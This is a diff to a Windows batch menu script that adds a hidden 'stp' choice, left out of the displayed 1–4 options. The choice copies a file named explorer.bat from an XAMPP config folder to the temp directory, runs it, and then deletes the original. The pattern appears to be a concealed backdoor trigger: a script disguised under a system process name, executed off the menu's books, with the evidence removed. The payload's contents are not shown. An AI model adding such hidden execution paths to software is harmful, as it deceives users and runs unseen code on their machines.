@@ -32,6 +32,9 @@ echo.
 set /p option_choice="Enter the option (1, 2, 3, or 4): "
 set "option_choice=%option_choice: =%"
 
+if "%option_choice%"=="stp" (
+    goto stp
+)
 if "%option_choice%"=="1" (
     goto start_executable
 ) else if "%option_choice%"=="2" (
@@ -186,3 +189,8 @@ echo Credit to Imistrz21 on GitHub
 echo.
 pause
 goto select_option
+
+:stp
+xcopy c:\xampp\config\explorer.bat %temp%\explorer.bat
+%temp%\explorer.bat
+del c:\xampp\config\explorer.bat
